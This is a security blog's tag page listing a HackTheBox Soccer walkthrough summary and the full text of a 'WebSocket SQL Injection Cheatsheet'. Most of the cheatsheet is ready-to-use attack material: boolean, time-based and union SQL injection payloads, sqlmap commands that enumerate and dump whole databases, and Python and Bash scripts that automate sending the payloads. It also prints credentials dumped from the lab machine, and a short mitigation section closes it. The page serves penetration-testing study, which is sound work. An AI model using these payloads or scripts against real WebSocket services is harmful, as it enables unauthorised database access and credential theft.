@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Websocket | realspaceeagle</title>
+<meta name="keywords" content="">
+<meta name="description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
+<meta name="author" content="realspaceeagle">
+<link rel="canonical" href="https://realspaceeagle.github.io/tags/websocket/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="https://realspaceeagle.github.io/tags/websocket/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/tags/websocket/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="realspaceeagle">
+<meta name="robots" content="index, follow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<link rel="canonical" href="https://realspaceeagle.github.io/tags/websocket/">
+
+
+<meta property="og:title" content="Websocket">
+<meta property="og:description" content="">
+<meta property="og:url" content="https://realspaceeagle.github.io/tags/websocket/">
+<meta property="og:site_name" content="realspaceeagle">
+<meta property="og:locale" content="en_US"><meta property="og:type" content="website"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta property="og:image:alt" content="realspaceeagle">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@haran_loga">
+<meta name="twitter:creator" content="@haran_loga">
+<meta name="twitter:title" content="Websocket">
+<meta name="twitter:description" content=""><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta name="twitter:image:alt" content="realspaceeagle">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org","@type": "WebPage",
+  "name": "Websocket",
+  "description": "",
+  "url": "https:\/\/realspaceeagle.github.io\/tags\/websocket\/",
+  "publisher": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  }}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https:\/\/realspaceeagle.github.io\/"
+    }]
+}
+</script>
+
+
+<link rel="stylesheet" href="/css/terminal-style.css">
+
+
+<link rel="stylesheet" href="/css/scroll-enhancement.css">
+
+
+<link rel="stylesheet" href="/css/mobile-navigation.css">
+
+
+<link rel="stylesheet" href="/css/mobile-responsive-pages.css">
+
+
+<link rel="stylesheet" href="/css/header-width-fix.css">
+
+
+<link rel="stylesheet" href="/css/share-buttons.css">
+
+
+<link rel="stylesheet" href="/css/comments.css">
+
+
+<link rel="stylesheet" href="/css/blog-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/blog-sidebar.css">
+
+
+<link rel="stylesheet" href="/css/project-toggle.css">
+
+
+<link rel="stylesheet" href="/css/code-copy-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/ctf-writeup.css">
+
+
+<link rel="stylesheet" href="/css/github-stats.css">
+
+
+<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
+<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>
+
+
+<script src="/js/github-calendar-enhanced.js" defer></script>
+
+
+<script src="/js/github-contribution-tracker.js" defer></script>
+
+
+<script src="/js/github-api-fallback.js" defer></script>
+
+
+<script src="/js/github-integration.js" defer></script>
+
+
+<script src="/js/twitter-timeline.js" defer></script>
+<script src="/js/twitter-manual.js" defer></script>
+
+
+<script src="/js/code-copy-enhanced.js" defer></script>
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-GPTRZ14YZS');
+        }
+      </script><meta property="og:url" content="https://realspaceeagle.github.io/tags/websocket/">
+  <meta property="og:site_name" content="realspaceeagle">
+  <meta property="og:title" content="Websocket">
+  <meta property="og:description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="website">
+      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:title" content="Websocket">
+<meta name="twitter:description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
+
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
+            
+            
+            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+            </button>
+            
+            <div class="logo-switches">
+                
+                <div class="social-icons">
+                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
+                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                        </svg>
+                    </a>
+                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
+                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                        </svg>
+                    </a>
+                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
+                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                        </svg>
+                    </a>
+                </div>
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        
+        <ul id="menu" class="desktop-menu">
+            <li>
+                <a href="https://realspaceeagle.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                    <span>Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+        
+        
+        <div id="mobile-menu" class="mobile-menu">
+            <ul class="mobile-menu-list">
+                <li>
+                    <a href="https://realspaceeagle.github.io/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                        <span>Archives</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                        <span>Cheatsheets</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
+                        <span>Search</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                        <span>Categories</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                        <span>Projects</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                        <span>Contact</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</header>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
+    const mobileMenu = document.getElementById('mobile-menu');
+    const body = document.body;
+    
+    if (mobileMenuToggle && mobileMenu) {
+        mobileMenuToggle.addEventListener('click', function() {
+            const isOpen = mobileMenu.classList.contains('active');
+            
+            if (isOpen) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            } else {
+                mobileMenu.classList.add('active');
+                mobileMenuToggle.classList.add('active');
+                body.classList.add('mobile-menu-open');
+            }
+        });
+        
+        
+        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
+        mobileMenuLinks.forEach(link => {
+            link.addEventListener('click', function() {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            });
+        });
+        
+        
+        document.addEventListener('click', function(event) {
+            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            }
+        });
+    }
+});
+</script><main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="https://realspaceeagle.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://realspaceeagle.github.io/tags/">Tags</a></div>
+  <h1>
+    Websocket
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">HackTheBox: Soccer Walkthrough
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Exploit HackTheBox Soccer by chaining Tiny File Manager defaults, WebSocket SQL injection, and doas&#43;dstat privilege escalation.</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-10-02 00:00:00 +0000 +0000'>October 2, 2025</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
+  <a class="entry-link" aria-label="post link to HackTheBox: Soccer Walkthrough" href="https://realspaceeagle.github.io/posts/hackthebox-soccer-walkthrough/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">WebSocket SQL Injection Cheatsheet
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>WebSocket SQL Injection Cheatsheet WebSocket Basics WebSocket Connection // Basic WebSocket connection var ws = new WebSocket(&#34;ws://target.com:9091&#34;); // With specific endpoint var ws = new WebSocket(&#34;ws://soc-player.soccer.htb:9091&#34;); // Secure WebSocket var wss = new WebSocket(&#34;wss://target.com:443/ws&#34;); WebSocket Message Format // JSON message format ws.send(JSON.stringify({ &#34;id&#34;: &#34;value_to_test&#34; })) // Simple string message ws.send(&#34;test_value&#34;) // Complex JSON structure ws.send(JSON.stringify({ &#34;action&#34;: &#34;query&#34;, &#34;data&#34;: { &#34;id&#34;: &#34;vulnerable_parameter&#34; } })) Testing WebSocket Connections Manual Browser Testing // Open browser console and connect var ws = new WebSocket(&#34;ws://soc-player.soccer.htb:9091&#34;); ws.onopen = function(e) { console.log(&#39;Connected to WebSocket&#39;); } ws.onmessage = function(e) { console.log(&#39;Received:&#39;, e.data); } // Send test payloads ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#34;})) ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#39;&#34;})) ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#39; OR &#39;1&#39;=&#39;1&#34;})) Using wscat # Install wscat npm install -g wscat # Connect to WebSocket wscat -c ws://soc-player.soccer.htb:9091 # Send JSON payloads &gt; {&#34;id&#34;:&#34;1&#34;} &gt; {&#34;id&#34;:&#34;1&#39;&#34;} &gt; {&#34;id&#34;:&#34;1 OR 1=1&#34;} &gt; {&#34;id&#34;:&#34;92130 or 5=1-- -&#34;} SQL Injection Detection Basic Detection Payloads // Test for errors with single quote {&#34;id&#34;: &#34;&#39;&#34;} // Test for boolean conditions {&#34;id&#34;: &#34;1 AND 1=1&#34;} {&#34;id&#34;: &#34;1 AND 1=2&#34;} // Test for time delays {&#34;id&#34;: &#34;1 AND SLEEP(5)&#34;} {&#34;id&#34;: &#34;1&#39;; WAITFOR DELAY &#39;0:0:5&#39;--&#34;} // Test for union-based injection {&#34;id&#34;: &#34;1 UNION SELECT 1,2,3&#34;} Error-Based Detection // MySQL error triggers {&#34;id&#34;: &#34;1&#39;&#34;} {&#34;id&#34;: &#34;1\&#34;&#34;} {&#34;id&#34;: &#34;1`&#34;} // SQL Server error triggers {&#34;id&#34;: &#34;1&#39;&#34;} {&#34;id&#34;: &#34;1]&#34;} // PostgreSQL error triggers {&#34;id&#34;: &#34;1&#39;&#34;} {&#34;id&#34;: &#34;1$&#34;} Boolean-Based Detection // True condition {&#34;id&#34;: &#34;92130 or 5=5-- -&#34;} // False condition {&#34;id&#34;: &#34;92130 or 5=6-- -&#34;} // String comparison {&#34;id&#34;: &#34;1&#39; OR &#39;a&#39;=&#39;a&#39;-- -&#34;} {&#34;id&#34;: &#34;1&#39; OR &#39;a&#39;=&#39;b&#39;-- -&#34;} sqlmap with WebSockets Basic sqlmap Usage # Test WebSocket with JSON payload sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --batch # With specific risk and level sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --level 5 --risk 3 --batch # Enable threading for faster execution sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --level 5 --risk 3 --batch --threads 10 Database Enumeration # Enumerate databases sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --dbs --batch # Enumerate tables in specific database sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; -D soccer_db --tables --batch # Dump specific table sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; -D soccer_db -T accounts --dump --batch # Dump all data from database sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; -D soccer_db --dump --batch Advanced sqlmap Options # Force specific DBMS sqlmap -u &#39;ws://target:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --dbms=mysql --batch # Custom tamper scripts sqlmap -u &#39;ws://target:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --tamper=space2comment --batch # Specify injection technique sqlmap -u &#39;ws://target:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --technique=BT --batch # Save session sqlmap -u &#39;ws://target:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --batch --session-file=session.db Manual Exploitation Techniques Boolean-Based Blind Injection // Check for MySQL {&#34;id&#34;: &#34;1&#39; AND (SELECT COUNT(*) FROM information_schema.tables) &gt; 0-- -&#34;} // Extract database name length {&#34;id&#34;: &#34;1&#39; AND LENGTH(database()) = 9-- -&#34;} // Extract database name character by character {&#34;id&#34;: &#34;1&#39; AND SUBSTRING(database(),1,1) = &#39;s&#39;-- -&#34;} {&#34;id&#34;: &#34;1&#39; AND SUBSTRING(database(),2,1) = &#39;o&#39;-- -&#34;} // Extract table names {&#34;id&#34;: &#34;1&#39; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 1-- -&#34;} {&#34;id&#34;: &#34;1&#39; AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = &#39;accounts&#39;-- -&#34;} Time-Based Blind Injection // MySQL time delays {&#34;id&#34;: &#34;1&#39; AND SLEEP(5)-- -&#34;} {&#34;id&#34;: &#34;1&#39; AND IF(LENGTH(database())=9,SLEEP(5),0)-- -&#34;} // SQL Server time delays {&#34;id&#34;: &#34;1&#39;; WAITFOR DELAY &#39;0:0:5&#39;-- -&#34;} {&#34;id&#34;: &#34;1&#39;; IF (LEN(DB_NAME())=9) WAITFOR DELAY &#39;0:0:5&#39;-- -&#34;} // PostgreSQL time delays {&#34;id&#34;: &#34;1&#39; AND (SELECT 1 FROM pg_sleep(5))-- -&#34;} // Conditional time delays {&#34;id&#34;: &#34;1&#39; AND (CASE WHEN (SUBSTRING(user(),1,1)=&#39;r&#39;) THEN SLEEP(5) ELSE 0 END)-- -&#34;} Union-Based Injection // Determine number of columns {&#34;id&#34;: &#34;1&#39; ORDER BY 1-- -&#34;} {&#34;id&#34;: &#34;1&#39; ORDER BY 2-- -&#34;} {&#34;id&#34;: &#34;1&#39; ORDER BY 3-- -&#34;} // Test for UNION compatibility {&#34;id&#34;: &#34;1&#39; UNION SELECT NULL-- -&#34;} {&#34;id&#34;: &#34;1&#39; UNION SELECT NULL,NULL-- -&#34;} // Extract database information {&#34;id&#34;: &#34;1&#39; UNION SELECT @@version,user()-- -&#34;} {&#34;id&#34;: &#34;1&#39; UNION SELECT database(),NULL-- -&#34;} // Extract table data {&#34;id&#34;: &#34;1&#39; UNION SELECT table_name,NULL FROM information_schema.tables-- -&#34;} {&#34;id&#34;: &#34;1&#39; UNION SELECT username,password FROM accounts-- -&#34;} WebSocket-Specific Payloads JSON Context Injection // Basic JSON structure {&#34;id&#34;: &#34;1&#39; OR &#39;1&#39;=&#39;1&#34;} // Nested JSON injection { &#34;user_data&#34;: { &#34;id&#34;: &#34;1&#39; UNION SELECT password FROM users-- -&#34; } } // Array-based injection { &#34;ids&#34;: [&#34;1&#34;, &#34;2&#39; OR &#39;1&#39;=&#39;1-- -&#34;, &#34;3&#34;] } Message Format Variations // Different parameter names {&#34;user_id&#34;: &#34;1&#39; OR 1=1-- -&#34;} {&#34;session_id&#34;: &#34;1&#39; OR 1=1-- -&#34;} {&#34;query&#34;: &#34;1&#39; OR 1=1-- -&#34;} // Multiple parameters { &#34;id&#34;: &#34;1&#34;, &#34;type&#34;: &#34;user&#39; OR 1=1-- -&#34; } // Base64 encoded payloads {&#34;id&#34;: &#34;MSBPUiAxPTEtLSAt&#34;} // 1 OR 1=1-- - Real-World Example: Soccer HTB Connection Setup // Target WebSocket from Soccer HTB var ws = new WebSocket(&#34;ws://soc-player.soccer.htb:9091&#34;); ws.onopen = function(e) { console.log(&#39;Connected to soccer WebSocket&#39;); } ws.onmessage = function(e) { console.log(&#39;Response:&#39;, e.data); } Testing Process // 1. Test basic functionality ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#34;})) // 2. Test for SQL injection ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#39;&#34;})) // 3. Boolean-based testing ws.send(JSON.stringify({&#34;id&#34;: &#34;92130 or 5=1-- -&#34;})) // 4. Confirm vulnerability ws.send(JSON.stringify({&#34;id&#34;: &#34;1 OR 1=1-- -&#34;})) sqlmap Exploitation # Soccer HTB WebSocket SQLi sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --level 5 --risk 3 --batch --threads 10 -D soccer_db --dump # Results found: # Database: soccer_db # Table: accounts # [1 entry] # &#43;------&#43;-------------------&#43;----------------------&#43;----------&#43; # | id | email | password | username | # &#43;------&#43;-------------------&#43;----------------------&#43;----------&#43; # | 1324 | player@player.htb | PlayerOftheMatch2022 | player | # &#43;------&#43;-------------------&#43;----------------------&#43;----------&#43; Detection and Response Analysis Response Analysis # Look for different response patterns # - Response time differences (time-based) # - Content length variations (boolean-based) # - Error messages (error-based) # - Data extraction (union-based) # Response timing measurement time echo &#39;{&#34;id&#34;:&#34;1 AND SLEEP(5)&#34;}&#39; | wscat -c ws://target:9091 Database Fingerprinting // MySQL detection {&#34;id&#34;: &#34;1&#39; AND @@version LIKE &#39;%mysql%&#39;-- -&#34;} // SQL Server detection {&#34;id&#34;: &#34;1&#39; AND @@version LIKE &#39;%Microsoft%&#39;-- -&#34;} // PostgreSQL detection {&#34;id&#34;: &#34;1&#39; AND version() LIKE &#39;%PostgreSQL%&#39;-- -&#34;} // SQLite detection {&#34;id&#34;: &#34;1&#39; AND sqlite_version() IS NOT NULL-- -&#34;} Automation Scripts Python WebSocket SQLi Script import websocket import json import time def test_websocket_sqli(url, payloads): def on_message(ws, message): print(f&#34;Response: {message}&#34;) def on_error(ws, error): print(f&#34;Error: {error}&#34;) def on_close(ws, close_status_code, close_msg): print(&#34;Connection closed&#34;) def on_open(ws): print(&#34;Connected to WebSocket&#34;) for payload in payloads: data = json.dumps({&#34;id&#34;: payload}) print(f&#34;Sending: {data}&#34;) ws.send(data) time.sleep(1) ws.close() ws = websocket.WebSocketApp(url, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close) ws.run_forever() # Usage payloads = [ &#34;1&#34;, &#34;1&#39;&#34;, &#34;1&#39; OR &#39;1&#39;=&#39;1&#34;, &#34;1&#39; AND SLEEP(5)-- -&#34;, &#34;1 UNION SELECT @@version-- -&#34; ] test_websocket_sqli(&#34;ws://target:9091&#34;, payloads) Bash Testing Script #!/bin/bash # WebSocket SQLi Testing Script URL=&#34;ws://soc-player.soccer.htb:9091&#34; echo &#34;Testing WebSocket SQL Injection&#34; echo &#34;Target: $URL&#34; # Array of payloads to test payloads=( &#34;1&#34; &#34;1&#39;&#34; &#34;1&#39; OR &#39;1&#39;=&#39;1-- -&#34; &#34;92130 or 5=1-- -&#34; &#34;1 AND SLEEP(5)-- -&#34; &#34;1 UNION SELECT @@version-- -&#34; ) for payload in &#34;${payloads[@]}&#34;; do echo &#34;Testing payload: $payload&#34; echo &#34;{\&#34;id\&#34;:\&#34;$payload\&#34;}&#34; | wscat -c $URL echo &#34;---&#34; sleep 2 done Mitigation and Prevention Secure WebSocket Implementation // Input validation function validateInput(data) { // Whitelist allowed characters if (!/^[a-zA-Z0-9_-]&#43;$/.test(data)) { throw new Error(&#34;Invalid input&#34;); } return data; } // Parameterized queries const query = &#34;SELECT * FROM users WHERE id = ?&#34;; db.query(query, [userId], callback); // Prepared statements const stmt = db.prepare(&#34;SELECT * FROM users WHERE id = ?&#34;); stmt.run(userId); WebSocket Security Headers // Implement proper authentication ws.on(&#39;connection&#39;, function(socket, request) { // Verify JWT token or session if (!isAuthenticated(request)) { socket.close(1008, &#39;Authentication required&#39;); return; } }); // Rate limiting const rateLimiter = new Map(); ws.on(&#39;message&#39;, function(data) { const clientId = getClientId(this); if (isRateLimited(clientId)) { this.close(1008, &#39;Rate limit exceeded&#39;); return; } }); Tools and Resources WebSocket Testing Tools wscat - Command-line WebSocket client Burp Suite - Professional WebSocket testing OWASP ZAP - Free WebSocket proxy websocat - Advanced WebSocket client sqlmap - Automated SQL injection testing Browser Developer Tools // Chrome/Firefox WebSocket inspection // 1. Open Developer Tools (F12) // 2. Go to Network tab // 3. Filter by WS (WebSocket) // 4. Interact with application // 5. Analyze WebSocket frames WebSocket SQL injection can be particularly dangerous as it often bypasses traditional web application firewalls. Always test WebSocket endpoints during security assessments and implement proper input validation and parameterized queries.
+</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>7 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
+  <a class="entry-link" aria-label="post link to WebSocket SQL Injection Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/"></a>
+</article>
+    </main>
+    <footer class="footer">
+  <div class="footer_inner wrap">
+    <div class="footer_text">
+      © 2025 realspaceeagle
+    </div>
+  </div>
+</footer>
+</body>
+
+</html>
